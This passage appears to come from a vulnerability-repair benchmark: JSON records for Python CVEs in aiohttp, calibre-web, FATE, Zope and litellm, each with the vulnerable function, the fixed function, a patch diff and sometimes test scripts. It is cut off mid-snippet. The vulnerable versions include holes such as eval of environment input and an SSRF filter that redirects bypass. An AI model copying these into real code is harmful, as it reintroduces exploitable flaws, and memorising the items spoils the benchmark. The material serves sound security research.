[
  {
    "cve_id": "CVE-2021-21330",
    "cve_description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. In aiohttp before version 3.7.4 there is an open redirect vulnerability. A maliciously crafted link to an aiohttp-based web-server could redirect the browser to a different website. It is caused by a bug in the `aiohttp.web_middlewares.normalize_path_middleware` middleware. This security problem has been fixed in 3.7.4. Upgrade your dependency using pip as follows \"pip install aiohttp >= 3.7.4\". If upgrading is not an option for you, a workaround can be to avoid using `aiohttp.web_middlewares.normalize_path_middleware` in your applications.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/aio-libs/aiohttp",
    "patch_url": [
      "https://github.com/aio-libs/aiohttp/commit/2545222a3853e31ace15d87ae0e2effb7da0c96b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_357_1",
        "commit": "f2afa2f054ba9e6c5d142e00233f0073925e7893",
        "file_path": "aiohttp/web_middlewares.py",
        "start_line": 88,
        "end_line": 117,
        "snippet": "    async def impl(request: Request, handler: _Handler) -> StreamResponse:\n        if isinstance(request.match_info.route, SystemRoute):\n            paths_to_check = []\n            if \"?\" in request.raw_path:\n                path, query = request.raw_path.split(\"?\", 1)\n                query = \"?\" + query\n            else:\n                query = \"\"\n                path = request.raw_path\n\n            if merge_slashes:\n                paths_to_check.append(re.sub(\"//+\", \"/\", path))\n            if append_slash and not request.path.endswith(\"/\"):\n                paths_to_check.append(path + \"/\")\n            if remove_slash and request.path.endswith(\"/\"):\n                paths_to_check.append(path[:-1])\n            if merge_slashes and append_slash:\n                paths_to_check.append(re.sub(\"//+\", \"/\", path + \"/\"))\n            if merge_slashes and remove_slash and path.endswith(\"/\"):\n                merged_slashes = re.sub(\"//+\", \"/\", path)\n                paths_to_check.append(merged_slashes[:-1])\n\n            for path in paths_to_check:\n                resolves, request = await _check_request_resolves(request, path)\n                if resolves:\n                    raise redirect_class(request.raw_path + query)\n\n        return await handler(request)\n\n    return impl"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_357_1",
        "commit": "2545222a3853e31ace15d87ae0e2effb7da0c96b",
        "file_path": "aiohttp/web_middlewares.py",
        "start_line": 88,
        "end_line": 118,
        "snippet": "    async def impl(request: Request, handler: _Handler) -> StreamResponse:\n        if isinstance(request.match_info.route, SystemRoute):\n            paths_to_check = []\n            if \"?\" in request.raw_path:\n                path, query = request.raw_path.split(\"?\", 1)\n                query = \"?\" + query\n            else:\n                query = \"\"\n                path = request.raw_path\n\n            if merge_slashes:\n                paths_to_check.append(re.sub(\"//+\", \"/\", path))\n            if append_slash and not request.path.endswith(\"/\"):\n                paths_to_check.append(path + \"/\")\n            if remove_slash and request.path.endswith(\"/\"):\n                paths_to_check.append(path[:-1])\n            if merge_slashes and append_slash:\n                paths_to_check.append(re.sub(\"//+\", \"/\", path + \"/\"))\n            if merge_slashes and remove_slash and path.endswith(\"/\"):\n                merged_slashes = re.sub(\"//+\", \"/\", path)\n                paths_to_check.append(merged_slashes[:-1])\n\n            for path in paths_to_check:\n                path = re.sub(\"^//+\", \"/\", path)  # SECURITY: GHSA-v6wp-4m6f-gcjg\n                resolves, request = await _check_request_resolves(request, path)\n                if resolves:\n                    raise redirect_class(request.raw_path + query)\n\n        return await handler(request)\n\n    return impl"
      }
    ],
    "vul_patch": "--- a/aiohttp/web_middlewares.py\n+++ b/aiohttp/web_middlewares.py\n@@ -21,6 +21,7 @@\n                 paths_to_check.append(merged_slashes[:-1])\n \n             for path in paths_to_check:\n+                path = re.sub(\"^//+\", \"/\", path)  # SECURITY: GHSA-v6wp-4m6f-gcjg\n                 resolves, request = await _check_request_resolves(request, path)\n                 if resolves:\n                     raise redirect_class(request.raw_path + query)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0767",
    "cve_description": "Server-Side Request Forgery (SSRF) in GitHub repository janeczku/calibre-web prior to 0.6.17.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/janeczku/calibre-web",
    "patch_url": [
      "https://github.com/janeczku/calibre-web/commit/965352c8d96c9eae7a6867ff76b0db137d04b0b8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_375_1",
        "commit": "8007e450b3178f517b83b0989744c6df38867932",
        "file_path": "cps/helper.py",
        "start_line": 732,
        "end_line": 751,
        "snippet": "def save_cover_from_url(url, book_path):\n    try:\n        if not cli.allow_localhost:\n            # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\n            ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\n            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\":\n                log.error(\"Localhost was accessed for cover upload\")\n                return False, _(\"You are not allowed to access localhost for cover uploads\")\n        img = requests.get(url, timeout=(10, 200))      # ToDo: Error Handling\n        img.raise_for_status()\n        return save_cover(img, book_path)\n    except (socket.gaierror,\n            requests.exceptions.HTTPError,\n            requests.exceptions.ConnectionError,\n            requests.exceptions.Timeout) as ex:\n        log.info(u'Cover Download Error %s', ex)\n        return False, _(\"Error Downloading Cover\")\n    except MissingDelegateError as ex:\n        log.info(u'File Format Error %s', ex)\n        return False, _(\"Cover Format Error\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_375_1",
        "commit": "965352c8d96c9eae7a6867ff76b0db137d04b0b8",
        "file_path": "cps/helper.py",
        "start_line": 732,
        "end_line": 751,
        "snippet": "def save_cover_from_url(url, book_path):\n    try:\n        if not cli.allow_localhost:\n            # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\n            ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\n            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\" or ip == \"0.0.0.0\" or ip == \"::\":\n                log.error(\"Localhost was accessed for cover upload\")\n                return False, _(\"You are not allowed to access localhost for cover uploads\")\n        img = requests.get(url, timeout=(10, 200), allow_redirects=False)      # ToDo: Error Handling\n        img.raise_for_status()\n        return save_cover(img, book_path)\n    except (socket.gaierror,\n            requests.exceptions.HTTPError,\n            requests.exceptions.ConnectionError,\n            requests.exceptions.Timeout) as ex:\n        log.info(u'Cover Download Error %s', ex)\n        return False, _(\"Error Downloading Cover\")\n    except MissingDelegateError as ex:\n        log.info(u'File Format Error %s', ex)\n        return False, _(\"Cover Format Error\")"
      }
    ],
    "vul_patch": "--- a/cps/helper.py\n+++ b/cps/helper.py\n@@ -3,10 +3,10 @@\n         if not cli.allow_localhost:\n             # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\n             ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\n-            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\":\n+            if ip.startswith(\"127.\") or ip.startswith('::ffff:7f') or ip == \"::1\" or ip == \"0.0.0.0\" or ip == \"::\":\n                 log.error(\"Localhost was accessed for cover upload\")\n                 return False, _(\"You are not allowed to access localhost for cover uploads\")\n-        img = requests.get(url, timeout=(10, 200))      # ToDo: Error Handling\n+        img = requests.get(url, timeout=(10, 200), allow_redirects=False)      # ToDo: Error Handling\n         img.raise_for_status()\n         return save_cover(img, book_path)\n     except (socket.gaierror,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-25459",
    "cve_description": "An issue was discovered in function sync_tree in hetero_decision_tree_guest.py in WeBank FATE (Federated AI Technology Enabler) 0.1 through 1.4.2 allows attackers to read sensitive information during the training process of machine learning joint modeling.",
    "cwe_info": {
      "CWE-668": {
        "name": "Exposure of Resource to Wrong Sphere",
        "description": "The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource."
      }
    },
    "repo": "https://github.com/FederatedAI/FATE",
    "patch_url": [
      "https://github.com/FederatedAI/FATE/commit/6feccf6d752184a6f9365d56a76fe627983e7139"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_44_1",
        "commit": "67708d5",
        "file_path": "federatedml/tree/hetero/hetero_decision_tree_guest.py",
        "start_line": 532,
        "end_line": 544,
        "snippet": "    def sync_tree(self):\n        LOGGER.info(\"sync tree to host\")\n\n        self.transfer_inst.tree.remote(self.tree_,\n                                       role=consts.HOST,\n                                       idx=-1)\n        \"\"\"\n        federation.remote(obj=self.tree_,\n                          name=self.transfer_inst.tree.name,\n                          tag=self.transfer_inst.generate_transferid(self.transfer_inst.tree),\n                          role=consts.HOST,\n                          idx=-1)\n        \"\"\""
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_44_1",
        "commit": "6feccf6",
        "file_path": "federatedml/tree/hetero/hetero_decision_tree_guest.py",
        "start_line": 544,
        "end_line": 557,
        "snippet": "    def sync_tree(self):\n        LOGGER.info(\"sync tree to host\")\n\n        tree_nodes = self.remove_sensitive_info()\n        self.transfer_inst.tree.remote(tree_nodes,\n                                       role=consts.HOST,\n                                       idx=-1)\n        \"\"\"\n        federation.remote(obj=self.tree_,\n                          name=self.transfer_inst.tree.name,\n                          tag=self.transfer_inst.generate_transferid(self.transfer_inst.tree),\n                          role=consts.HOST,\n                          idx=-1)\n        \"\"\""
      },
      {
        "id": "fix_py_44_2",
        "commit": "6feccf6",
        "file_path": "federatedml/tree/hetero/hetero_decision_tree_host.py",
        "start_line": 532,
        "end_line": 542,
        "snippet": "        return model_param\n\n    def set_model_param(self, model_param):\n        self.tree_ = []\n        for node_param in model_param.tree_:\n            _node = Node(id=node_param.id,\n                         sitename=node_param.sitename,\n                         fid=node_param.fid,\n                         bid=node_param.bid,\n                         weight=node_param.weight,\n                         is_leaf=node_param.is_leaf,"
      }
    ],
    "vul_patch": "--- a/federatedml/tree/hetero/hetero_decision_tree_guest.py\n+++ b/federatedml/tree/hetero/hetero_decision_tree_guest.py\n@@ -1,7 +1,8 @@\n     def sync_tree(self):\n         LOGGER.info(\"sync tree to host\")\n \n-        self.transfer_inst.tree.remote(self.tree_,\n+        tree_nodes = self.remove_sensitive_info()\n+        self.transfer_inst.tree.remote(tree_nodes,\n                                        role=consts.HOST,\n                                        idx=-1)\n         \"\"\"\n\n--- /dev/null\n+++ b/federatedml/tree/hetero/hetero_decision_tree_guest.py\n@@ -0,0 +1,11 @@\n+        return model_param\n+\n+    def set_model_param(self, model_param):\n+        self.tree_ = []\n+        for node_param in model_param.tree_:\n+            _node = Node(id=node_param.id,\n+                         sitename=node_param.sitename,\n+                         fid=node_param.fid,\n+                         bid=node_param.bid,\n+                         weight=node_param.weight,\n+                         is_leaf=node_param.is_leaf,\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-25459:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/FATE\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-25459/bin/python  hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-25459:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/FATE\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-25459/bin/python -m pytest federatedml/tree/test/ -v"
  },
  {
    "cve_id": "CVE-2021-32633",
    "cve_description": "Zope is an open-source web application server. In Zope versions prior to 4.6 and 5.2, users can access untrusted modules indirectly through Python modules that are available for direct use. By default, only users with the Manager role can add or edit Zope Page Templates through the web, but sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk from this vulnerability. The problem has been fixed in Zope 5.2 and 4.6. As a workaround, a site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/zopefoundation/Zope",
    "patch_url": [
      "https://github.com/zopefoundation/Zope/commit/1f8456bf1f908ea46012537d52bd7e752a532c91"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_145_1",
        "commit": "1746d5a",
        "file_path": "src/Products/PageTemplates/Expressions.py",
        "start_line": 64,
        "end_line": 82,
        "snippet": "def boboAwareZopeTraverse(object, path_items, econtext):\n    \"\"\"Traverses a sequence of names, first trying attributes then items.\n\n    This uses zope.traversing path traversal where possible and interacts\n    correctly with objects providing OFS.interface.ITraversable when\n    necessary (bobo-awareness).\n    \"\"\"\n    request = getattr(econtext, 'request', None)\n    path_items = list(path_items)\n    path_items.reverse()\n\n    while path_items:\n        name = path_items.pop()\n        if OFS.interfaces.ITraversable.providedBy(object):\n            object = object.restrictedTraverse(name)\n        else:\n            object = traversePathElement(object, name, path_items,\n                                         request=request)\n    return object"
      },
      {
        "id": "vul_py_145_2",
        "commit": "1746d5a",
        "file_path": "src/Products/PageTemplates/expression.py",
        "start_line": 56,
        "end_line": 70,
        "snippet": "    def traverse(cls, base, request, path_items):\n        \"\"\"See ``zope.app.pagetemplate.engine``.\"\"\"\n\n        path_items = list(path_items)\n        path_items.reverse()\n\n        while path_items:\n            name = path_items.pop()\n            if ITraversable.providedBy(base):\n                base = getattr(base, cls.traverseMethod)(name)\n            else:\n                base = traversePathElement(base, name, path_items,\n                                           request=request)\n\n        return base"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_145_1",
        "commit": "1f8456b",
        "file_path": "src/Products/PageTemplates/Expressions.py",
        "start_line": 65,
        "end_line": 91,
        "snippet": "def boboAwareZopeTraverse(object, path_items, econtext):\n    \"\"\"Traverses a sequence of names, first trying attributes then items.\n\n    This uses zope.traversing path traversal where possible and interacts\n    correctly with objects providing OFS.interface.ITraversable when\n    necessary (bobo-awareness).\n    \"\"\"\n    request = getattr(econtext, 'request', None)\n    path_items = list(path_items)\n    path_items.reverse()\n\n    while path_items:\n        name = path_items.pop()\n\n        if name == '_':\n            warnings.warn('Traversing to the name `_` is deprecated '\n                          'and will be removed in Zope 6.',\n                          DeprecationWarning)\n        elif name.startswith('_'):\n            raise NotFound(name)\n\n        if OFS.interfaces.ITraversable.providedBy(object):\n            object = object.restrictedTraverse(name)\n        else:\n            object = traversePathElement(object, name, path_items,\n                                         request=request)\n    return object"
      },
      {
        "id": "fix_py_145_2",
        "commit": "1f8456b",
        "file_path": "src/Products/PageTemplates/expression.py",
        "start_line": 57,
        "end_line": 79,
        "snippet": "    def traverse(cls, base, request, path_items):\n        \"\"\"See ``zope.app.pagetemplate.engine``.\"\"\"\n\n        path_items = list(path_items)\n        path_items.reverse()\n\n        while path_items:\n            name = path_items.pop()\n\n            if name == '_':\n                warnings.warn('Traversing to the name `_` is deprecated '\n                              'and will be removed in Zope 6.',\n                              DeprecationWarning)\n            elif name.startswith('_'):\n                raise NotFound(name)\n\n            if ITraversable.providedBy(base):\n                base = getattr(base, cls.traverse_method)(name)\n            else:\n                base = traversePathElement(base, name, path_items,\n                                           request=request)\n\n        return base"
      }
    ],
    "vul_patch": "--- a/src/Products/PageTemplates/Expressions.py\n+++ b/src/Products/PageTemplates/Expressions.py\n@@ -11,6 +11,14 @@\n \n     while path_items:\n         name = path_items.pop()\n+\n+        if name == '_':\n+            warnings.warn('Traversing to the name `_` is deprecated '\n+                          'and will be removed in Zope 6.',\n+                          DeprecationWarning)\n+        elif name.startswith('_'):\n+            raise NotFound(name)\n+\n         if OFS.interfaces.ITraversable.providedBy(object):\n             object = object.restrictedTraverse(name)\n         else:\n\n--- a/src/Products/PageTemplates/expression.py\n+++ b/src/Products/PageTemplates/expression.py\n@@ -6,8 +6,16 @@\n \n         while path_items:\n             name = path_items.pop()\n+\n+            if name == '_':\n+                warnings.warn('Traversing to the name `_` is deprecated '\n+                              'and will be removed in Zope 6.',\n+                              DeprecationWarning)\n+            elif name.startswith('_'):\n+                raise NotFound(name)\n+\n             if ITraversable.providedBy(base):\n-                base = getattr(base, cls.traverseMethod)(name)\n+                base = getattr(base, cls.traverse_method)(name)\n             else:\n                 base = traversePathElement(base, name, path_items,\n                                            request=request)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-5751",
    "cve_description": "BerriAI/litellm version v1.35.8 contains a vulnerability where an attacker can achieve remote code execution. The vulnerability exists in the `add_deployment` function, which decodes and decrypts environment variables from base64 and assigns them to `os.environ`. An attacker can exploit this by sending a malicious payload to the `/config/update` endpoint, which is then processed and executed by the server when the `get_secret` function is triggered. This requires the server to use Google KMS and a database to store a model.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/BerriAI/litellm",
    "patch_url": [
      "https://github.com/BerriAI/litellm/commit/fcea4c22ad96b24436f196ae709f71932e84b0b8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_224_1",
        "commit": "2b9e953",
        "file_path": "litellm/utils.py",
        "start_line": 7065,
        "end_line": 7274,
        "snippet": "def get_secret(\n    secret_name: str,\n    default_value: Optional[Union[str, bool]] = None,\n):\n    key_management_system = litellm._key_management_system\n    key_management_settings = litellm._key_management_settings\n    args = locals()\n\n    if secret_name.startswith(\"os.environ/\"):\n        secret_name = secret_name.replace(\"os.environ/\", \"\")\n\n    # Example: oidc/google/https://bedrock-runtime.us-east-1.amazonaws.com/model/stability.stable-diffusion-xl-v1/invoke\n    if secret_name.startswith(\"oidc/\"):\n        secret_name_split = secret_name.replace(\"oidc/\", \"\")\n        oidc_provider, oidc_aud = secret_name_split.split(\"/\", 1)\n        # TODO: Add caching for HTTP requests\n        if oidc_provider == \"google\":\n            oidc_token = oidc_cache.get_cache(key=secret_name)\n            if oidc_token is not None:\n                return oidc_token\n\n            oidc_client = HTTPHandler(timeout=httpx.Timeout(timeout=600.0, connect=5.0))\n            # https://cloud.google.com/compute/docs/instances/verifying-instance-identity#request_signature\n            response = oidc_client.get(\n                \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity\",\n                params={\"audience\": oidc_aud},\n                headers={\"Metadata-Flavor\": \"Google\"},\n            )\n            if response.status_code == 200:\n                oidc_token = response.text\n                oidc_cache.set_cache(key=secret_name, value=oidc_token, ttl=3600 - 60)\n                return oidc_token\n            else:\n                raise ValueError(\"Google OIDC provider failed\")\n        elif oidc_provider == \"circleci\":\n            # https://circleci.com/docs/openid-connect-tokens/\n            env_secret = os.getenv(\"CIRCLE_OIDC_TOKEN\")\n            if env_secret is None:\n                raise ValueError(\"CIRCLE_OIDC_TOKEN not found in environment\")\n            return env_secret\n        elif oidc_provider == \"circleci_v2\":\n            # https://circleci.com/docs/openid-connect-tokens/\n            env_secret = os.getenv(\"CIRCLE_OIDC_TOKEN_V2\")\n            if env_secret is None:\n                raise ValueError(\"CIRCLE_OIDC_TOKEN_V2 not found in environment\")\n            return env_secret\n        elif oidc_provider == \"github\":\n            # https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers#using-custom-actions\n            actions_id_token_request_url = os.getenv(\"ACTIONS_ID_TOKEN_REQUEST_URL\")\n            actions_id_token_request_token = os.getenv(\"ACTIONS_ID_TOKEN_REQUEST_TOKEN\")\n            if (\n                actions_id_token_request_url is None\n                or actions_id_token_request_token is None\n            ):\n                raise ValueError(\n                    \"ACTIONS_ID_TOKEN_REQUEST_URL or ACTIONS_ID_TOKEN_REQUEST_TOKEN not found in environment\"\n                )\n\n            oidc_token = oidc_cache.get_cache(key=secret_name)\n            if oidc_token is not None:\n                return oidc_token\n\n            oidc_client = HTTPHandler(timeout=httpx.Timeout(timeout=600.0, connect=5.0))\n            response = oidc_client.get(\n                actions_id_token_request_url,\n                params={\"audience\": oidc_aud},\n                headers={\n                    \"Authorization\": f\"Bearer {actions_id_token_request_token}\",\n                    \"Accept\": \"application/json; api-version=2.0\",\n                },\n            )\n            if response.status_code == 200:\n                oidc_token = response.text[\"value\"]\n                oidc_cache.set_cache(key=secret_name, value=oidc_token, ttl=300 - 5)\n                return oidc_token\n            else:\n                raise ValueError(\"Github OIDC provider failed\")\n        elif oidc_provider == \"azure\":\n            # https://azure.github.io/azure-workload-identity/docs/quick-start.html\n            azure_federated_token_file = os.getenv(\"AZURE_FEDERATED_TOKEN_FILE\")\n            if azure_federated_token_file is None:\n                raise ValueError(\"AZURE_FEDERATED_TOKEN_FILE not found in environment\")\n            with open(azure_federated_token_file, \"r\") as f:\n                oidc_token = f.read()\n                return oidc_token\n        else:\n            raise ValueError(\"Unsupported OIDC provider\")\n\n    try:\n        if litellm.secret_manager_client is not None:\n            try:\n                client = litellm.secret_manager_client\n                key_manager = \"local\"\n                if key_management_system is not None:\n                    key_manager = key_management_system.value\n\n                if key_management_settings is not None:\n                    if (\n                        secret_name not in key_management_settings.hosted_keys\n                    ):  # allow user to specify which keys to check in hosted key manager\n                        key_manager = \"local\"\n\n                if (\n                    key_manager == KeyManagementSystem.AZURE_KEY_VAULT.value\n                    or type(client).__module__ + \".\" + type(client).__name__\n                    == \"azure.keyvault.secrets._client.SecretClient\"\n                ):  # support Azure Secret Client - from azure.keyvault.secrets import SecretClient\n                    secret = client.get_secret(secret_name).value\n                elif (\n                    key_manager == KeyManagementSystem.GOOGLE_KMS.value\n                    or client.__class__.__name__ == \"KeyManagementServiceClient\"\n                ):\n                    encrypted_secret: Any = os.getenv(secret_name)\n                    if encrypted_secret is None:\n                        raise ValueError(\n                            f\"Google KMS requires the encrypted secret to be in the environment!\"\n                        )\n                    b64_flag = _is_base64(encrypted_secret)\n                    if b64_flag == True:  # if passed in as encoded b64 string\n                        encrypted_secret = base64.b64decode(encrypted_secret)\n                    if not isinstance(encrypted_secret, bytes):\n                        # If it's not, assume it's a string and encode it to bytes\n                        ciphertext = eval(\n                            encrypted_secret.encode()\n                        )  # assuming encrypted_secret is something like - b'\\n$\\x00D\\xac\\xb4/t)07\\xe5\\xf6..'\n                    else:\n                        ciphertext = encrypted_secret\n\n                    response = client.decrypt(\n                        request={\n                            \"name\": litellm._google_kms_resource_name,\n                            \"ciphertext\": ciphertext,\n                        }\n                    )\n                    secret = response.plaintext.decode(\n                        \"utf-8\"\n                    )  # assumes the original value was encoded with utf-8\n                elif key_manager == KeyManagementSystem.AWS_KMS.value:\n                    \"\"\"\n                    Only check the tokens which start with 'aws_kms/'. This prevents latency impact caused by checking all keys.\n                    \"\"\"\n                    encrypted_value = os.getenv(secret_name, None)\n                    if encrypted_value is None:\n                        raise Exception(\"encrypted value for AWS KMS cannot be None.\")\n                    # Decode the base64 encoded ciphertext\n                    ciphertext_blob = base64.b64decode(encrypted_value)\n\n                    # Set up the parameters for the decrypt call\n                    params = {\"CiphertextBlob\": ciphertext_blob}\n\n                    # Perform the decryption\n                    response = client.decrypt(**params)\n\n                    # Extract and decode the plaintext\n                    plaintext = response[\"Plaintext\"]\n                    secret = plaintext.decode(\"utf-8\")\n                elif key_manager == KeyManagementSystem.AWS_SECRET_MANAGER.value:\n                    try:\n                        get_secret_value_response = client.get_secret_value(\n                            SecretId=secret_name\n                        )\n                        print_verbose(\n                            f\"get_secret_value_response: {get_secret_value_response}\"\n                        )\n                    except Exception as e:\n                        print_verbose(f\"An error occurred - {str(e)}\")\n                        # For a list of exceptions thrown, see\n                        # https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html\n                        raise e\n\n                    # assume there is 1 secret per secret_name\n                    secret_dict = json.loads(get_secret_value_response[\"SecretString\"])\n                    print_verbose(f\"secret_dict: {secret_dict}\")\n                    for k, v in secret_dict.items():\n                        secret = v\n                    print_verbose(f\"secret: {secret}\")\n                elif key_manager == \"local\":\n                    secret = os.getenv(secret_name)\n                else:  # assume the default is infisicial client\n                    secret = client.get_secret(secret_name).secret_value\n            except Exception as e:  # check if it's in os.environ\n                verbose_logger.error(\n                    f\"An exception occurred - {str(e)}\\n\\n{traceback.format_exc()}\"\n                )\n                secret = os.getenv(secret_name)\n            try:\n                secret_value_as_bool = ast.literal_eval(secret)\n                if isinstance(secret_value_as_bool, bool):\n                    return secret_value_as_bool\n                else:\n                    return secret\n            except:\n                return secret\n        else:\n            secret = os.environ.get(secret_name)\n            try:\n                secret_value_as_bool = (\n                    ast.literal_eval(secret) if secret is not None else None\n                )\n                if isinstance(secret_value_as_bool, bool):\n                    return secret_value_as_bool\n                else:\n                    return secret\n            except:\n                return secret\n    except Exception as e:\n        if default_value is not None:\n            return default_value\n        else:\n            raise e"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_224_1",
        "commit": "fcea4c2",
        "file_path": "litellm/utils.py",
        "start_line": 7065,
        "end_line": 7271,
        "snippet": "def get_secret(\n    secret_name: str,\n    default_value: Optional[Union[str, bool]] = None,\n):\n    key_management_system = litellm._key_management_system\n    key_management_settings = litellm._key_management_settings\n    args = locals()\n\n    if secret_name.startswith(\"os.environ/\"):\n        secret_name = secret_name.replace(\"os.environ/\", \"\")\n\n    # Example: oidc/google/https://bedrock-runtime.us-east-1.amazonaws.com/model/stability.stable-diffusion-xl-v1/invoke\n    if secret_name.startswith(\"oidc/\"):\n        secret_name_split = secret_name.replace(\"oidc/\", \"\")\n        oidc_provider, oidc_aud = secret_name_split.split(\"/\", 1)\n        # TODO: Add caching for HTTP requests\n        if oidc_provider == \"google\":\n            oidc_token = oidc_cache.get_cache(key=secret_name)\n            if oidc_token is not None:\n                return oidc_token\n\n            oidc_client = HTTPHandler(timeout=httpx.Timeout(timeout=600.0, connect=5.0))\n            # https://cloud.google.com/compute/docs/instances/verifying-instance-identity#request_signature\n            response = oidc_client.get(\n                \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity\",\n                params={\"audience\": oidc_aud},\n                headers={\"Metadata-Flavor\": \"Google\"},\n            )\n            if response.status_code == 200:\n                oidc_token = response.text\n                oidc_cache.set_cache(key=secret_name, value=oidc_token, ttl=3600 - 60)\n                return oidc_token\n            else:\n                raise ValueError(\"Google OIDC provider failed\")\n        elif oidc_provider == \"circleci\":\n            # https://circleci.com/docs/openid-connect-tokens/\n            env_secret = os.getenv(\"CIRCLE_OIDC_TOKEN\")\n            if env_secret is None:\n                raise ValueError(\"CIRCLE_OIDC_TOKEN not found in environment\")\n            return env_secret\n        elif oidc_provider == \"circleci_v2\":\n            # https://circleci.com/docs/openid-connect-tokens/\n            env_secret = os.getenv(\"CIRCLE_OIDC_TOKEN_V2\")\n            if env_secret is None:\n                raise ValueError(\"CIRCLE_OIDC_TOKEN_V2 not found in environment\")\n            return env_secret\n        elif oidc_provider == \"github\":\n            # https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers#using-custom-actions\n            actions_id_token_request_url = os.getenv(\"ACTIONS_ID_TOKEN_REQUEST_URL\")\n            actions_id_token_request_token = os.getenv(\"ACTIONS_ID_TOKEN_REQUEST_TOKEN\")\n            if (\n                actions_id_token_request_url is None\n                or actions_id_token_request_token is None\n            ):\n                raise ValueError(\n                    \"ACTIONS_ID_TOKEN_REQUEST_URL or ACTIONS_ID_TOKEN_REQUEST_TOKEN not found in environment\"\n                )\n\n            oidc_token = oidc_cache.get_cache(key=secret_name)\n            if oidc_token is not None:\n                return oidc_token\n\n            oidc_client = HTTPHandler(timeout=httpx.Timeout(timeout=600.0, connect=5.0))\n            response = oidc_client.get(\n                actions_id_token_request_url,\n                params={\"audience\": oidc_aud},\n                headers={\n                    \"Authorization\": f\"Bearer {actions_id_token_request_token}\",\n                    \"Accept\": \"application/json; api-version=2.0\",\n                },\n            )\n            if response.status_code == 200:\n                oidc_token = response.text[\"value\"]\n                oidc_cache.set_cache(key=secret_name, value=oidc_token, ttl=300 - 5)\n                return oidc_token\n            else:\n                raise ValueError(\"Github OIDC provider failed\")\n        elif oidc_provider == \"azure\":\n            # https://azure.github.io/azure-workload-identity/docs/quick-start.html\n            azure_federated_token_file = os.getenv(\"AZURE_FEDERATED_TOKEN_FILE\")\n            if azure_federated_token_file is None:\n                raise ValueError(\"AZURE_FEDERATED_TOKEN_FILE not found in environment\")\n            with open(azure_federated_token_file, \"r\") as f:\n                oidc_token = f.read()\n                return oidc_token\n        else:\n            raise ValueError(\"Unsupported OIDC provider\")\n\n    try:\n        if litellm.secret_manager_client is not None:\n            try:\n                client = litellm.secret_manager_client\n                key_manager = \"local\"\n                if key_management_system is not None:\n                    key_manager = key_management_system.value\n\n                if key_management_settings is not None:\n                    if (\n                        secret_name not in key_management_settings.hosted_keys\n                    ):  # allow user to specify which keys to check in hosted key manager\n                        key_manager = \"local\"\n\n                if (\n                    key_manager == 